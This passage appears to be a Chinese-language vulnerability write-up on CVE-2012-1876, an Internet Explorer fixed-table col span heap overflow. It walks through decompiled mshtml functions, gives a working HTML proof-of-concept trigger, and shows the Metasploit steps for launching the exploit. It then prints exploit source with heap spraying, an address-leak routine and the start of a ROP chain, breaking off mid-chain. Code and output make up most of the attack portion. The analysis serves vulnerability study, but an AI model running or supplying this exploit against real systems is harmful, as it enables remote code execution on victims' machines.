&lt;&lt; 8)) &amp; 0x100;      if ( v67 )      &#123;        if ( v130 == v120 )        &#123;          v132 = CTableCellLayout::GetBorderAndPaddingCore(v90, 1, (const struct CDocInfo *)a3, 0, 0);          v87 = CWidthUnitValue::GetPixelWidth(v125, (const struct CDocInfo *)a3, 0, (int)v103);          v88 = v132 + v87;        &#125;        else        &#123;          v88 = v39[1];        &#125;        v132 = v88;        v136 = v88;        if ( !v124 )        &#123;LABEL_155:          v72 = 1;          if ( AAcolSpan == 1 )          &#123;            if ( (int)v135 &gt; v131 &amp;&amp; (v39[5] &amp; 1) != 0 )              v72 = 0;            CTableColCalc::AdjustForCell(              (CTableColCalc *)(v130 == v120),              a2,              PixelWidth,              v125,              v72,              v130 == v120,              (struct CCalcInfo *)a3,              v132,              v136);          &#125;          else          &#123;            if ( v137 - (_DWORD)v135 == *((_DWORD *)a2 + 55) )            &#123;              CImplPtrAry::Append((CImplPtrAry *)v60, v103);              v90 = v121;              v39 = v128;            &#125;            v9 = (AAcolSpan - 1) * (*((_DWORD *)a2 + 48) + 1);            v10 = *((_DWORD *)v90 + 50);            if ( v9 &gt; v10 )            &#123;              v4 = *((_DWORD *)v90 + 52);              *((_DWORD *)v90 + 53) = -1;              *((_DWORD *)v90 + 52) = v9 + v4 - v10;              *((_DWORD *)v90 + 51) = -1;              *((_DWORD *)v90 + 50) = v9;            &#125;            if ( (int)v135 &lt;= v131 || v134 &amp;&amp; v130 == v120 || v124 &amp;&amp; v130 != v120 )            &#123;              v11 = AAcolSpan;              ++i;              if ( AAcolSpan &gt; 0 )              &#123;                v12 = v39 + 3;                do                &#123;                  ++*v12;                  v12 += 7;                  --v11;                &#125;                while ( v11 );              &#125;            &#125;            else if ( !v134 &amp;&amp; v130 == v120 )            &#123;              v91 = (char *)v135 + *((_DWORD *)a2 + 20) - v137;              v134 = AAcolSpan;              if ( AAcolSpan &gt;= (int)v91 )                v134 = (int)v91;              v92 = (v136 - *((_DWORD *)a2 + 48) * (v134 - 1)) / v134;              v93 = (v136 - *((_DWORD *)a2 + 48) * (v134 - 1)) % v134;              v94 = v39;              do              &#123;                v95 = v92 + (v93 &gt; 0);                v94[2] = v95;                v94[1] = v95;                *v94 = v95;                if ( (unsigned int)v94 &gt; v127 )                  v127 = (int)v94;                v94 += 7;                --v134;                --v93;              &#125;              while ( v134 );            &#125;          &#125;          if ( !v114 &amp;&amp; v109 == 1 )            CTableRowLayout::AdjustHeight(v112, v113, (struct CCalcInfo *)a3, v116);          goto LABEL_40;        &#125;      &#125;      if ( v124        || ((v68 = *((_DWORD *)a2 + 17), (v68 &amp; 1) != 0) || (v68 &amp; 0x1000000) != 0 &amp;&amp; (*((_BYTE *)v90 + 264) &amp; 2) != 0)        &amp;&amp; *((char *)v90 + 24) &lt; 0 )      &#123;        *((_DWORD *)v90 + 52) = -1;        *((_DWORD *)v90 + 53) = -1;        *((_DWORD *)v90 + 50) = -1;        *((_DWORD *)v90 + 51) = -1;        *((_DWORD *)v90 + 6) &amp;= ~0x80u;      &#125;      CalculateCellMinMax(v90, (struct CTableCalcInfo *)a3, (struct tagSIZE *)v103);      if ( v110 &lt; v117 )        v117 = v110;      v132 = *((_DWORD *)a2 + 17);      if ( (v132 &amp; 0x20) != 0 &amp;&amp; !CTableCellLayout::NoContent((CTableCellLayout *)v60) )        *((_DWORD *)a2 + 17) = v132 &amp; 0xFFFFFFDF;      v69 = (char *)v90 + 264;      if ( (*((_DWORD *)v90 + 20) &amp; 0x4000) != 0 )      &#123;        *((_DWORD *)a2 + 17) |= 0x800u;        *v69 |= 2u;      &#125;      else      &#123;        *v69 &amp;= ~2u;      &#125;      if ( (*v69 &amp; 1) != 0 )      &#123;        CalculateCellMin(v103, v105, v106);        v70 = v118;        if ( v118 &lt; 0 )        &#123;          v70 = 0;          v118 = 0;        &#125;        v89 = (int *)((char *)v121 + 200);        if ( *((_DWORD *)v121 + 50) == v70 )          goto LABEL_146;        *((_DWORD *)v121 + 51) = -1;        *v89 = v70;      &#125;      v70 = v118;LABEL_146:      if ( v134 )      &#123;        v136 = v117;        v132 = v70;        if ( (int)v135 &lt;= v131 )        &#123;          v71 = v125;          if ( !CUnitValue::IsNullOrEnum((CUnitValue *)v60)            &amp;&amp; CUnitValue::IsScalerUnit(*(_DWORD *)v71 &amp; 0xF)            &amp;&amp; PixelWidth )          &#123;            v136 = PixelWidth;          &#125;        &#125;        v90 = v121;        if ( v136 &lt; v70 )          v136 = v70;      &#125;      else      &#123;        if ( v136 &lt;= v70 )          v136 = v70;        v90 = v121;        v132 = v136;      &#125;      v39 = v128;      goto LABEL_155;    &#125;LABEL_41:    --v130;    v133 = (CTableLayout *)((char *)v133 + 4);  &#125;  while ( v130 &gt; 0 );  if ( i )  &#123;    v122 = 0;    v131 = 0;    CTableLayout::AdjustForColSpan(v36, a2, (struct CTableColCalc *)a3, v127);  &#125;LABEL_44:  v51 = *((_DWORD *)a2 + 17);  if ( (v51 &amp; 2) != 0 &amp;&amp; (v51 &amp; 0x400) != 0 || (a3[15].cy &amp; 4) != 0 )    *((_DWORD *)a2 + 17) = v51 | 0x800;LABEL_47:  v52 = *((_DWORD *)a2 + 77);  if ( v52 )  &#123;    v96 = *(_DWORD *)(v52 + 4) &gt;&gt; 2;    v140 = *(CElement ***)(v52 + 12);    while ( v96 &gt; 0 )    &#123;      v97 = CElement::GetUpdatedLayout(*v140, (struct CLayoutContext *)a3[1].cy);      CalculateCellMinMax(v97, (struct CTableCalcInfo *)a3, (struct tagSIZE *)v103);      if ( v110 &lt; v117 )        v117 = v110;      --v96;      ++v140;    &#125;  &#125;  v53 = 0;  v54 = 0;  if ( v137 )  &#123;    v39 = (_DWORD *)*((_DWORD *)a2 + 39);    if ( (unsigned int)v39 &lt;= v127 )    &#123;      v55 = (*((_DWORD *)a2 + 17) &gt;&gt; 21) &amp; 1;      do      &#123;        v54 += v39[1];        v53 += *v39;        if ( v54 &gt; 0x3FFFFFFF )          v54 = 0x3FFFFFFF;        if ( !v55 &amp;&amp; (v39[5] &amp; 0x28) == 0 )          ++*((_DWORD *)a2 + 56);        v39 += 7;      &#125;      while ( (unsigned int)v39 &lt;= v127 );    &#125;  &#125;  if ( *((_DWORD *)a2 + 22) &lt; v53 )    *((_DWORD *)a2 + 22) = v53;  if ( *((_DWORD *)a2 + 24) &lt; v54 )    *((_DWORD *)a2 + 24) = v54;  v56 = *((_DWORD *)a2 + 22);  v57 = 0;  if ( v56 || *((_DWORD *)a2 + 24) )  &#123;    v58 = *((_DWORD *)a2 + 45) + *((_DWORD *)a2 + 47) + *((_DWORD *)a2 + 48) * (*((_DWORD *)a2 + 56) + 1);    *((_DWORD *)a2 + 24) += v58;    *((_DWORD *)a2 + 22) = v58 + v56;  &#125;  if ( v111    &amp;&amp; (*((_DWORD *)a2 + 24) &lt; SpecifiedPixelWidth     || *((_DWORD *)a2 + 56) == 1 &amp;&amp; !CUnitValue::IsScalerUnit(*(v39 - 1) &amp; 0xF)) )  &#123;    SpecifiedPixelWidth = v57;  &#125;  v59 = *((_DWORD *)a2 + 83) &gt;&gt; 2;  v139 = (CElement **)*((_DWORD *)a2 + 85);  if ( v59 &gt; v57 )  &#123;    do    &#123;      v99 = CElement::GetUpdatedLayout(*v139, (struct CLayoutContext *)a3[1].cy);      if ( v99 )      &#123;        CLayout::CalcSize(v98, v99, a3, 0);        v132 = *((_DWORD *)a2 + 17);        if ( (v132 &amp; 0x20) != 0 &amp;&amp; !CTableCellLayout::NoContent(v100) )          *((_DWORD *)a2 + 17) = v132 &amp; 0xFFFFFFDF;        v101 = v118;        if ( *((_DWORD *)a2 + 22) &lt; v118 )          *((_DWORD *)a2 + 22) = v118;        if ( *((_DWORD *)a2 + 24) &lt; v101 )          *((_DWORD *)a2 + 24) = v101;        if ( (*((_DWORD *)a2 + 74) &amp; 0xFFFFFFFC) == 0 &amp;&amp; *((_DWORD *)a2 + 24) &lt; v117 )          *((_DWORD *)a2 + 24) = v117;      &#125;      ++v139;      --v59;    &#125;    while ( v59 &gt; 0 );  &#125;  if ( SpecifiedPixelWidth )  &#123;    v6 = SpecifiedPixelWidth;    if ( SpecifiedPixelWidth &gt; *((_DWORD *)a2 + 22) )    &#123;      *((_DWORD *)a2 + 24) = SpecifiedPixelWidth;      *((_DWORD *)a2 + 22) = v6;    &#125;  &#125;LABEL_66:  v36 = (CUnitValue *)a3;  a3[5].cx = cx;LABEL_67:  CImplAry::~CImplAry(v36);&#125;\n\n通过 IDA 提供的 CFG 对 esi 进行污点分析得出\n.text:74EBF43B                               loc_74EBF43B:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+1953BE↑j.text:74EBF43B 8B 83 9C 00 00 00             mov     eax, [ebx+9Ch]....text:74EBF447 89 45 D8                      mov     [ebp+var_28], eax....text:74EBF46F 8B 75 D8                      mov     esi, [ebp+var_28]\n\nesi 的值为 [ebx+9Ch]。对应反编译代码\nv128 = (_DWORD *)(v86 + *((_DWORD *)a2 + 39));...CTableColCalc::AdjustForCol(v125, v128, v135, (int)a3, v122, (int)v103);\n\n仅靠动态分析难以得出 esi 指向的究竟是什么值，回到动态调试查看 esi 的值发现指向一个大小为 0x70 的堆块，查看堆块信息发现其由 CImplAry::EnsureSizeWorker 函数分配，定位到该函数，其反汇编代码为\n.text:74DF349E.text:74DF349E                               ; =============== S U B R O U T I N E =======================================.text:74DF349E.text:74DF349E                               ; Attributes: bp-based frame.text:74DF349E.text:74DF349E                               ; int __userpurge CImplAry::EnsureSizeWorker@&lt;eax&gt;(unsigned int@&lt;eax&gt;, int@&lt;edi&gt;, unsigned int Size).text:74DF349E                               ?EnsureSizeWorker@CImplAry@@AAEJIJ@Z proc near.text:74DF349E                                                                       ; CODE XREF: CPtsBlockContainerParaclient::SetupDisplayBox(Ptls5::fscontext *,Ptls5::fspara * const,CRect const *,CInlineRelativeStackingContext *,TSmartPointer&lt;CDisplayBox&gt; &amp;,CDisplayBox * *,long,long,ulong,bool)-69DE4↑p.text:74DF349E                                                                       ; CDataAry&lt;Ptls5::fsapedescription&gt;::EnsureSize(long)-72EED↑p.text:74DF349E                                                                       ; CClassTable::AssignClsidID(CDoc *,_GUID const &amp;,long *)-985F8↑p.text:74DF349E                                                                       ; CView::DeferTransition(COleSite *)+3F↑p.text:74DF349E                                                                       ; CView::DeferSetObjectRects(COleSite *,tagRECT const *,tagRECT const *,HWND__ *,int)+5D↑p.text:74DF349E                                                                       ; CTableRowBlock::EnsureColumnCount(int)+2660↑p.text:74DF349E                                                                       ; CCssDocumentLayout::StorePage(int,CCssPageLayout *,Ptls5::fspage *,Ptls5::fsbreakrecpage *)-58FA8↑p.text:74DF349E                                                                       ; CDataStream::SaveDataLater(ulong *,ulong)+8A↑p.text:74DF349E                                                                       ; CHtmPre::SaveBuffer(void)+32↑p.text:74DF349E                                                                       ; CHtmPre::SaveBuffer(void)+65↑p.text:74DF349E                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+187↑p.text:74DF349E                                                                       ; CDataAry&lt;CAttrValue&gt;::EnsureSize(long)+18↑p.text:74DF349E                                                                       ; CImplAry::Grow(uint,int)-8D651↑p.text:74DF349E                                                                       ; CDataRecovery::StartSaveDataTimer(void)+21↑p.text:74DF349E                                                                       ; FormsSetTimer(void *,long (CVoid::*)(uint),uint,uint)-44997↑p ....text:74DF349E.text:74DF349E                               dwBytes= dword ptr -8.text:74DF349E                               var_4= dword ptr -4.text:74DF349E                               Size= dword ptr  8.text:74DF349E.text:74DF349E                               ; FUNCTION CHUNK AT .text:74DF64F3 SIZE 00000036 BYTES.text:74DF349E                               ; FUNCTION CHUNK AT .text:74E2DF00 SIZE 0000003D BYTES.text:74DF349E                               ; FUNCTION CHUNK AT .text:74EB723C SIZE 0000000D BYTES.text:74DF349E.text:74DF349E 8B FF                         mov     edi, edi.text:74DF34A0 55                            push    ebp.text:74DF34A1 8B EC                         mov     ebp, esp.text:74DF34A3 51                            push    ecx.text:74DF34A4 51                            push    ecx.text:74DF34A5 53                            push    ebx.text:74DF34A6 56                            push    esi                             ; unsigned int.text:74DF34A7 8B F0                         mov     esi, eax.text:74DF34A9 6A 04                         push    4.text:74DF34AB 58                            pop     eax.text:74DF34AC 89 45 FC                      mov     [ebp+var_4], eax.text:74DF34AF 3B F0                         cmp     esi, eax.text:74DF34B1 0F 83 3C 30 00 00             jnb     loc_74DF64F3.text:74DF34B1.text:74DF34B7.text:74DF34B7                               loc_74DF34B7:                           ; CODE XREF: CImplAry::EnsureSizeWorker(uint,long)+3058↓j.text:74DF34B7                                                                       ; CImplAry::EnsureSizeWorker(uint,long)+307D↓j.text:74DF34B7                                                                       ; CImplAry::EnsureSizeWorker(uint,long)+3086↓j.text:74DF34B7 8B 45 FC                      mov     eax, [ebp+var_4].text:74DF34BA F7 65 08                      mul     [ebp+Size].text:74DF34BD 52                            push    edx.text:74DF34BE 50                            push    eax                             ; unsigned __int64.text:74DF34BF 8D 45 F8                      lea     eax, [ebp+dwBytes].text:74DF34C2 E8 1F A3 FE FF                call    ?ULongLongToUInt@@YGJ_KPAI@Z    ; ULongLongToUInt(unsigned __int64,uint *).text:74DF34C2.text:74DF34C7 8B D8                         mov     ebx, eax.text:74DF34C9 85 DB                         test    ebx, ebx.text:74DF34CB 75 25                         jnz     short loc_74DF34F2.text:74DF34CB.text:74DF34CD F6 47 04 02                   test    byte ptr [edi+4], 2.text:74DF34D1 0F 85 29 AA 03 00             jnz     loc_74E2DF00.text:74DF34D1.text:74DF34D7 FF 75 F8                      push    [ebp+dwBytes]                   ; dwBytes.text:74DF34DA 8D 77 0C                      lea     esi, [edi+0Ch].text:74DF34DD E8 C3 A2 FE FF                call    ?_HeapRealloc@@YGJPAPAXI@Z      ; _HeapRealloc(void * *,uint).text:74DF34DD.text:74DF34E2 8B D8                         mov     ebx, eax.text:74DF34E4 85 DB                         test    ebx, ebx.text:74DF34E6 75 0A                         jnz     short loc_74DF34F2.text:74DF34E6.text:74DF34E8.text:74DF34E8                               loc_74DF34E8:                           ; CODE XREF: CImplAry::EnsureSizeWorker(uint,long)+3AA9A↓j.text:74DF34E8 8B 45 FC                      mov     eax, [ebp+var_4].text:74DF34EB 83 67 04 FD                   and     dword ptr [edi+4], 0FFFFFFFDh.text:74DF34EF 89 47 08                      mov     [edi+8], eax.text:74DF34EF.text:74DF34F2.text:74DF34F2                               loc_74DF34F2:                           ; CODE XREF: CImplAry::EnsureSizeWorker(uint,long)+2D↑j.text:74DF34F2                                                                       ; CImplAry::EnsureSizeWorker(uint,long)+48↑j.text:74DF34F2                                                                       ; CImplAry::EnsureSizeWorker(uint,long)+3074↓j.text:74DF34F2                                                                       ; CImplAry::EnsureSizeWorker(uint,long)+C3DA6↓j.text:74DF34F2 5E                            pop     esi.text:74DF34F3 8B C3                         mov     eax, ebx.text:74DF34F5 5B                            pop     ebx.text:74DF34F6 C9                            leave.text:74DF34F7 C2 04 00                      retn    4.text:74DF34F7.text:74DF34F7                               ?EnsureSizeWorker@CImplAry@@AAEJIJ@Z endp.text:74DF34F7.text:74DF34F7                               ; ---------------------------------------------------------------------------\n\n其反编译代码为\nint __userpurge CImplAry::EnsureSizeWorker@&lt;eax&gt;(unsigned int a1@&lt;eax&gt;, int a2@&lt;edi&gt;, unsigned int Size)&#123;  int v5; // ebx  unsigned int v6; // eax  const void *v8; // esi  void *v9; // eax  unsigned int *v10; // [esp+0h] [ebp-10h]  unsigned int v11; // [esp+0h] [ebp-10h]  SIZE_T dwBytes; // [esp+8h] [ebp-8h]  unsigned int v13; // [esp+Ch] [ebp-4h] BYREF  unsigned int Sizea; // [esp+18h] [ebp+8h]  v13 = 4;  if ( a1 &gt;= 4 )  &#123;    v13 = a1;    if ( a1 &gt; 4 )    &#123;      v5 = ULongAdd(*(_DWORD *)(a2 + 8), *(_DWORD *)(a2 + 8) &gt;&gt; 1, &amp;v13);      if ( v5 )        return v5;      if ( a1 &gt; v13 )        v13 = a1;    &#125;  &#125;  v5 = ULongLongToUInt(Size * (unsigned __int64)v13, v10);  if ( !v5 )  &#123;    if ( (*(_BYTE *)(a2 + 4) &amp; 2) != 0 )    &#123;      v8 = *(const void **)(a2 + 12);      Sizea = CImplAry::GetAlloced((CImplAry *)a2, Size);      v9 = HeapAlloc(g_hProcessHeap, 0, dwBytes);      *(_DWORD *)(a2 + 12) = v9;      if ( !v9 )      &#123;        *(_DWORD *)(a2 + 12) = v8;        return -2147024882;      &#125;      memcpy(v9, v8, Sizea);      goto LABEL_5;    &#125;    v5 = _HeapRealloc(dwBytes, v11);    if ( !v5 )    &#123;LABEL_5:      v6 = v13;      *(_DWORD *)(a2 + 4) &amp;= ~2u;      *(_DWORD *)(a2 + 8) = v6;    &#125;  &#125;  return v5;&#125;\n\n由于这些函数实际上是 CTableLayout 对象的方法，结合 CTableLayout 对象的定义与 CTableLayout::CalculateMinMax 函数调用 CImplAry::EnsureSizeWorker 函数时的上下文可知 CImplAry::EnsureSizeWorker 函数的参数 a1 实际上是 table 标签里 col 元素中的 span 属性值的和，此处记作 span_sum，参数 Size 为常量 0x1C。因此 CImplAry::EnsureSizeWorker 函数分配的内存空间大小为 span_sum * 0x1C，若 span_sum 小于 4 则分配 4 * 0x1C &#x3D; 0x70 大小的堆块\n因此,Crash Point 处 Access Violation 的目标地址 edi 实际上是一个堆块偏移 18h 处的内存，或者说 CrashPoint 的反编译代码中的 a2 实际上是一个堆指针\n.text:75050A2B 8D 7E 18                      lea     edi, [esi+18h].text:75050A2E 50                            push    eax.text:75050A2F 89 0F                         mov     [edi], ecx //! Crash Point\n\na2[6] = *a1; //! Crash Point\n\n带着这样的认识，重新审计 CTableLayout::CalculateMinMax 函数调用 CTableColCalc::AdjustForCol 函数时的调用逻辑与 CTableColCalc::AdjustForCol 函数\nvoid __thiscall CTableLayout::CalculateMinMax(        CTableLayout *this,        struct CTableCalcInfo *a2,        struct tagSIZE *a3,        int a4)&#123;    if ( *((_DWORD *)a2 + 37) &gt;&gt; 2 &gt;= v137 )      goto LABEL_22;    if ( v137 &lt; 0 )    &#123;      v38 = -2147024809;    &#125;    else    &#123;  ...            if ( CElement::IsDisplayNone(v36) )          &#123;            AAspan = 1;            v16 = 0;          &#125;          else          &#123;            AAspan = CTableCol::GetAAspan(v80);            if ( AAspan &gt;= 1000 )              AAspan = 1000;            v125 = (const struct CFancyFormat *)((char *)CTreeNode::GetFancyFormat(*(CTreeNode **)(i + 20)) + 112);            v16 = CUnitValue::IsNullOrEnum(v81) == 0;          &#125;            ...          v133 = 0;          if ( AAspan &gt; 0 )          &#123;            v86 = 28 * v136;            v124 += AAspan;            for ( i = 28 * v136; ; v86 = i )            &#123;              v128 = (_DWORD *)(v86 + *((_DWORD *)a2 + 39));              if ( v131 &amp;&amp; AAspan &gt; 1 &amp;&amp; v133 == (CTableLayout *)(AAspan - 1) )                v135 = (struct CWidthUnitValue *)(PixelWidth - (_DWORD)v135 * (AAspan - 1));              CTableColCalc::AdjustForCol(v125, v128, v135, (int)a3, v122, (int)v103);              v133 = (CTableLayout *)((char *)v133 + 1);              i += 28;              if ( (int)v133 &gt;= AAspan )                break;            &#125;          &#125;      v38 = ((_DWORD (__thiscall *)(CImplAry *, unsigned int))CImplAry::EnsureSizeWorker)(v36, 0x1Cu);    &#125;&#125;void __userpurge CTableColCalc::AdjustForCol(        _DWORD *a1@&lt;eax&gt;,        _DWORD *a2@&lt;esi&gt;,        const struct CWidthUnitValue *a3,        int a4,        struct CCalcInfo *a5,        int a6)&#123;  int v6; // [esp-4h] [ebp-Ch]  v6 = *a1 &amp; 0xF;  a2[6] = *a1;  if ( CUnitValue::IsScalerUnit(v6) )  &#123;    CUnitValue::SetValue(a2 + 6, 8);    a2[1] = a3;    *a2 = a3;  &#125;  else  &#123;    if ( a5 != (struct CCalcInfo *)1 )      CUnitValue::SetPercent((CUnitValue *)0x64, (int)(a2 + 6));    *a2 = 1;    a2[1] = *(_DWORD *)(a4 + 16);  &#125;  a2[2] = a3;&#125;\n\n\nCTableColCalc::AdjustForCol 函数中写入的数据是什么不是很重要因此没有赘述，但事实上写入堆块的数据是 col 元素的 with 属性值乘以一百，具体计算过程见 CWidthUnitValue::GetPixelWidth 函数。\n\n我们能够注意到 CTableColCalc::AdjustForCol 函数是在一个 for 循环中被调用的，这个循环会循环 AAspan 次，其中 AAspan 是 CTableCol::GetAAspan 函数的返回值，它的最大值为 1000，最小值为 1。同时每次循环，传入 CTableColCalc::AdjustForCol 函数的堆块基址都会增加\nfor ( i = 28 * v136; ; v86 = i )&#123;  v128 = (_DWORD *)(v86 + *((_DWORD *)a2 + 39));  ...  CTableColCalc::AdjustForCol(v125, v128, v135, (int)a3, v122, (int)v103);  ...  i += 28;  ...&#125;\n\n这意味着其实动态调试时只有 CTableColCalc::AdjustForCol 函数第一次被调用时，它的第二个参数才是堆块的起始地址，而循环次数每增加一次，CTableColCalc::AdjustForCol 函数写入数据的目标地址都会向高地址方向偏移 0x1C。或者简单地说，这个循环总是会向堆块中写入 AAspan * 0x1C 长度的数据\n\n堆块的大小也为 span_sum * 0x1C，不难联想到 AAspan 就是 span_num，具体过程可见 CTableCol::GetAAspan 函数\n\n分析 CTableLayout::CalculateMinMax 函数的执行流，会发现在一定条件下，函数会复用之前申请的堆块而不是重新申请新的堆块。因此如果 CTableLayout::CalculateMinMax 函数第二次执行时的 AAspan 大于它第一次执行时的 AAspan 值且堆块被复用，程序将会发生堆溢出\n&lt;!--POC.html--&gt;&lt;html&gt;  &lt;body&gt;    &lt;table style=&quot;table-layout:fixed&quot;&gt;    ​  &lt;col id=&quot;132&quot; width=&quot;41&quot; span=&quot;1&quot; &gt;&lt;/col&gt;    &lt;/table&gt;    &lt;script&gt;      function over_trigger() &#123;      ​        var obj_col = document.getElementById(&quot;132&quot;);      ​        obj_col.width = &quot;42765&quot;;      ​        obj_col.span = 1000;      &#125;      setTimeout(&quot;over_trigger();&quot;,1);    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;\n\n样本中的代码也确实是这么做的，它创建了一个 span 值为 1 的 col 标签，随后通过 JavaScript 将其 span 值修改为了最大值 1000，进而触发了堆溢出\n漏洞利用使用 MSF 搜索该漏洞的 exp\nmsfconsolemsf6 &gt; search cve-2012-1876\n\n搜索结果\nMatching Modules================   #  Name                                                 Disclosure Date  Rank    Check  Description   -  ----                                                 ---------------  ----    -----  -----------   0  exploit/windows/browser/ms12_037_ie_colspan          2012-06-12       normal  No     MS12-037 Microsoft Internet Explorer Fixed Table Col Span Heap Overflow   1    \\_ target: Automatic                               .                .       .      .   2    \\_ target: IE 8 on Windows XP SP3 with msvcrt ROP  .                .       .      .   3    \\_ target: IE 8 on Windows 7 SP1                   .                .       .      .Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/browser/ms12_037_ie_colspanAfter interacting with a module you can manually set a TARGET with set TARGET &#x27;IE 8 on Windows 7 SP1&#x27;\n\n调用该模块并查看模块详情\nmsf6 &gt; use exploit/windows/browser/ms12_037_ie_colspanmsf6 exploit(windows/browser/ms12_037_ie_colspan) &gt; info\n\n模块详情信息\n       Name: MS12-037 Microsoft Internet Explorer Fixed Table Col Span Heap Overflow     Module: exploit/windows/browser/ms12_037_ie_colspan   Platform: Windows       Arch: Privileged: No    License: Metasploit Framework License (BSD)       Rank: Normal  Disclosed: 2012-06-12Provided by:  Alexandre Pelletier  mr_me &lt;steventhomasseeley@gmail.com&gt;  binjo  sinn3r &lt;sinn3r@metasploit.com&gt;  juan vazquez &lt;juan.vazquez@metasploit.com&gt;Available targets:      Id  Name      --  ----  =&gt;  0   Automatic      1   IE 8 on Windows XP SP3 with msvcrt ROP      2   IE 8 on Windows 7 SP1Check supported:  NoBasic options:  Name       Current Setting  Required  Description  ----       ---------------  --------  -----------  OBFUSCATE  false            no        Enable JavaScript obfuscation  SRVHOST    *******          yes       The local host or network interface to listen on. This must be an address on the lo                                          cal machine or ******* to listen on all addresses.  SRVPORT    8080             yes       The local port to listen on.  SSL        false            no        Negotiate SSL for incoming connections  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)  URIPATH                     no        The URI to use for this exploit (default is random)Payload information:  Space: 1024  Avoid: 1 charactersDescription:  This module exploits a heap overflow vulnerability in Internet Explorer caused  by an incorrect handling of the span attribute for col elements from a fixed table,  when they are modified dynamically by javascript code.References:  https://nvd.nist.gov/vuln/detail/CVE-2012-1876  OSVDB (82866)  http://www.securityfocus.com/bid/53848  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/MS12-037View the full module info with the info -d command.\n\n使用该模块生成木马\nmsf6 exploit(windows/browser/ms12_037_ie_colspan) &gt; set payload windows/execmsf6 exploit(windows/browser/ms12_037_ie_colspan) &gt; set CMD calc.exemsf6 exploit(windows/browser/ms12_037_ie_colspan) &gt; exploit\n\n随后 MSF 将在本地启动 Web Server 并在攻击目标访问时为其响应异常 HTML 页面以触发漏洞\nExploit 分析该模块的 exp 位于\n/usr/share/metasploit-framework/modules/exploits/windows/browser/ms12_037_ie_colspan.rb\n\nexp 的核心代码为\nrequire &#x27;msf/core&#x27;class Metasploit3 &lt; Msf::Exploit::Remote    Rank = NormalRanking    include Msf::Exploit::Remote::HttpServer::HTML    def initialize(info = &#123;&#125;)        super(update_info(info,            &#x27;Name&#x27;           =&gt; &#x27;HeapLib test 1&#x27;,            &#x27;Description&#x27;    =&gt; %q&#123;...&#125;,            &#x27;License&#x27;        =&gt; MSF_LICENSE,            &#x27;Author&#x27;         =&gt; [ &#x27;corelanc0d3r&#x27; ],            &#x27;Version&#x27;        =&gt; &#x27;$Revision: $&#x27;,            &#x27;References&#x27;     =&gt; [...],            &#x27;DefaultOptions&#x27; =&gt; &#123;...&#125;,            &#x27;Payload&#x27;        =&gt; &#123;...&#125;,            &#x27;Platform&#x27;       =&gt; &#x27;win&#x27;,            &#x27;Targets&#x27;        =&gt; [...],            &#x27;DisclosureDate&#x27; =&gt; &#x27;&#x27;,            &#x27;DefaultTarget&#x27;  =&gt; 0))    end    def autofilter        false    end    #* 生成 ROP 链    def get_rop  rop = [    0x41414141,  # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN    0x42424242,  # (dwSize)    0x43434343,  # RETN (ROP NOP)    0x44444444,  # JMP [EAX]    0x45454545,    0x46464646,  # skip 4 bytes    0x47474747,  # INC EBX # FPATAN # RETN    0x48484848,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN    0x49494949,  # POP EDX # RETN    0x4a4a4a4a,  # flNewProtect    0x4b4b4b4b,  # POP ECX # RETN    0x4c4c4c4c,  # &amp;Writable location    0x4d4d4d4d,  # POP EAX # RETN    0x4e4e4e4e,  # ptr to &amp;VirtualProtect() - 0x0EF [IAT msvcr71.dll]    0x4f4f4f4f,  # PUSHAD # ADD AL,0EF # RETN    0x50505050,  # ptr to &#x27;push esp #  ret &#x27;  ].pack(&quot;V*&quot;)  return rop    end    def check_dependencies        use_zlib    end    #* 路由响应函数    def on_request_uri(cli, request)        # Re-generate the payload.        return if ((p = regenerate_payload(cli)) == nil)        # Encode some fake shellcode (breakpoints)        #code = &quot;\\xcc&quot; * 400        #code_js = Rex::Text.to_unescape(code, Rex::Arch.endian(target.arch))        heap_determinism = &lt;&lt;-JS          var leak_index = -1;        var dap = &quot;EEEE&quot;;        while ( dap.length &lt; 480 ) dap += dap;        var padding = &quot;AAAA&quot;;        while ( padding.length &lt; 480 ) padding += padding;        var filler = &quot;BBBB&quot;;        while ( filler.length &lt; 480 ) filler += filler;        //spray        var arr = new Array();        var rra = new Array();        var div_container = document.getElementById(&quot;test&quot;);        div_container.style.cssText = &quot;display:none&quot;;        for (var i=0; i &lt; 500; i+=2) &#123;            // E            rra[i] = dap.substring(0, (0x100-6)/2);            // S, bstr = A            arr[i] = padding.substring(0, (0x100-6)/2);            // A, bstr = B            arr[i+1] = filler.substring(0, (0x100-6)/2);            // B            var obj = document.createElement(&quot;button&quot;);            div_container.appendChild(obj);        &#125;        for (var i=200; i&lt;500; i+=2 ) &#123;            rra[i] = null;            CollectGarbage();        &#125;        JS        table_builder = &#x27;&#x27;        0.upto(132) do |i|            table_builder &lt;&lt; &quot;&lt;table style=\\&quot;table-layout:fixed\\&quot; &gt;&lt;col id=\\&quot;#&#123;i&#125;\\&quot; width=\\&quot;41\\&quot; span=\\&quot;9\\&quot; &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&quot;        end  # shellcode  #js_code =  Rex::Text.to_unescape(&quot;\\xcc&quot; * 540, Rex::Arch.endian(target.arch))  js_code =  Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))        trigger_js = &lt;&lt;-SJ        var obj_col = document.getElementById(&quot;132&quot;);        obj_col.span = 19;          function over_trigger() &#123;            var leak_addr = -1;            for ( var i = 0; i &lt; 500; i++ ) &#123;                if ( arr[i].length &gt; (0x100-6)/2 ) &#123; // overflowed        leak_index = i;                    var leak = arr[i].substring((0x100-6)/2+(2+8)/2, (0x100-6)/2+(2+8+4)/2);                    leak_addr = parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16 );        mshtmlbase = leak_addr - Number(0x001582b8);        alert(mshtmlbase);                    break;                &#125;            &#125;            if ( leak_addr == -1 || leak_index == -1 ) &#123; alert(&quot;memory leak failed....&quot;); &#125;      //return mshtmlbase;        &#125;  // A very special heap spray  function heap_spray()&#123;       CollectGarbage();    var heapobj = new Object();        // generated with mona.py (mshtml.dll v)        function rop_chain(mshtmlbase)&#123;            var arr = [        mshtmlbase + Number(0x00001031),        mshtmlbase + Number(0x00002c78),    // pop ebp; retn        mshtmlbase + Number(0x0001b4e3),    // 